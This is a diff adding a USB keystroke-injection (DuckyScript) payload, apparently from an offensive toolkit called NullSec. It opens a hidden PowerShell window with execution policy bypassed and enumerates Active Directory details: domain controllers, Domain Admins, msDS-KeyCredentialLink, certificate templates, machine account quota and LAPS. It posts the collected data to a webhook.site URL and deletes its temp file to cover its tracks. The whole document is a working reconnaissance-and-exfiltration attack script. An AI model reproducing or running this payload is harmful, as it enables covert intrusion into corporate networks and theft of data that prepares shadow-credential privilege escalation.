@@ -1,0 +1,98 @@
+REM NullSec - Active Directory Shadow Credential Attack Prep
+REM Collects AD info needed for shadow credential attacks
+REM Requires domain-joined machine
+
+GUI r
+DELAY 500
+STRING powershell -w hidden -ep bypass
+ENTER
+DELAY 1000
+
+STRING $adInfo = @{}
+ENTER
+
+REM Check if domain joined
+STRING $adInfo.DomainJoined = (Get-WmiObject Win32_ComputerSystem).PartOfDomain
+ENTER
+STRING $adInfo.Domain = (Get-WmiObject Win32_ComputerSystem).Domain
+ENTER
+DELAY 200
+
+REM Get domain controller info
+STRING if ($adInfo.DomainJoined) {
+    $adInfo.DomainController = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().FindDomainController().Name
+    $adInfo.ForestName = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().Name
+}
+ENTER
+DELAY 300
+
+REM Current user info
+STRING $adInfo.CurrentUser = @{
+    Name = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+    Groups = [System.Security.Principal.WindowsIdentity]::GetCurrent().Groups | ForEach-Object { $_.Translate([System.Security.Principal.NTAccount]).Value }
+    IsAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+}
+ENTER
+DELAY 300
+
+REM Check for msDS-KeyCredentialLink support (shadow cred attack vector)
+STRING $adInfo.KeyCredentialSupport = $null
+STRING try {
+    $searcher = [adsisearcher]"(&(objectCategory=person)(objectClass=user)(sAMAccountName=$env:USERNAME))"
+    $searcher.PropertiesToLoad.Add("msDS-KeyCredentialLink") | Out-Null
+    $result = $searcher.FindOne()
+    $adInfo.KeyCredentialSupport = @{
+        AttributeExists = $result.Properties.Contains("msds-keycredentiallink")
+        CurrentValue = $result.Properties["msds-keycredentiallink"]
+    }
+} catch {}
+ENTER
+DELAY 300
+
+REM Enumerate privileged accounts
+STRING $adInfo.PrivilegedAccounts = @{}
+STRING try {
+    $searcher = [adsisearcher]"(&(objectCategory=person)(memberOf=CN=Domain Admins,CN=Users,DC=*))"
+    $adInfo.PrivilegedAccounts.DomainAdmins = $searcher.FindAll() | ForEach-Object { $_.Properties.samaccountname }
+} catch {}
+ENTER
+DELAY 300
+
+REM Check ADCS (certificate services) for ESC vulnerabilities
+STRING $adInfo.CertificateServices = @{}
+STRING try {
+    $cas = certutil -config - -ping 2>&1
+    $adInfo.CertificateServices.Available = $cas -notmatch 'error'
+    $templates = certutil -catemplates 2>&1
+    $adInfo.CertificateServices.Templates = $templates | Where-Object {$_ -match ':'}
+} catch {}
+ENTER
+DELAY 300
+
+REM Get machine account quota (for adding shadow computer)
+STRING try {
+    $root = [ADSI]"LDAP://RootDSE"
+    $adInfo.MachineAccountQuota = ([ADSI]"LDAP://$($root.defaultNamingContext)").Properties["ms-DS-MachineAccountQuota"]
+} catch {}
+ENTER
+DELAY 200
+
+REM LAPS info
+STRING $adInfo.LAPS = @{
+    Installed = Test-Path 'C:\Program Files\LAPS\CSE\AdmPwd.dll'
+    LegacyLAPS = (Get-ADObject -Filter {objectClass -eq 'attributeSchema'} -SearchBase (Get-ADRootDSE).schemaNamingContext -Properties name | Where-Object {$_.name -eq 'ms-Mcs-AdmPwd'}) -ne $null
+}
+ENTER
+DELAY 200
+
+REM Export
+STRING $adInfo | ConvertTo-Json -Depth 5 | Out-File "$env:TEMP\ad_shadow.json"
+ENTER
+DELAY 200
+
+STRING try { Invoke-RestMethod -Uri "https://webhook.site/YOUR-ID" -Method Post -Body ($adInfo | ConvertTo-Json -Depth 5) } catch {}
+ENTER
+DELAY 500
+
+STRING Remove-Item "$env:TEMP\ad_shadow.json" -Force 2>$null; exit
+ENTER
